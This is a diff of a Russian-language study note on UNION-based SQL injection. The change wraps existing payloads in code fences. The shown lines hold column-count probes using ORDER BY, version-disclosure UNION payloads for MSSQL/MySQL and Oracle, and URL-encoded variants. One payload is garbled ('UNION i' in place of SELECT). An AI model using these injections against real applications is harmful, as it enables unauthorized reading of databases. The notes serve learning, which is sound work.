@@ -25,6 +25,7 @@ SELECT a, b FROM table1 UNION SELECT c, d FROM table2
 2)-  Какие столбцы, возвращенные из исходного запроса, имеют подходящий тип данных для хранения результатов из введенного запроса.
 
 #### Способы понять число столбцов
+```sql
 ' ORDER BY 1--     # Если работает → есть минимум 1 столбец
 ' ORDER BY 2--     # Если работает → есть минимум 2 столбца
 ' ORDER BY 3--     # Если ошибка → всего 2 столбца
@@ -40,7 +41,7 @@ SELECT a, b FROM table1 UNION SELECT c, d FROM table2
 
 `NULL совместим с любым типом данных`
 `Работает во всех СУБД (MySQL, PostgreSQL, MSSQL, Oracle)
-
+```
 
 
 
@@ -61,6 +62,7 @@ SELECT a, b FROM table1 UNION SELECT c, d FROM table2
 ```
 
 url кодир
+```sql
 ' UNION i @@version,NULL--     
 %27 %55%4e%49%4f%4e i @@version,NULL%2d%2d
 
@@ -69,6 +71,7 @@ url кодир
 
  UNION SELECT banner,NULL FROM v$version--
 %27 %55%4e%49%4f%4e %53%45%4c%45%43%54 banner,NULL FROM v$version%2d%2d
+```
 
 
 ==если UNION не работает ????? то  пробуем  ----> ==
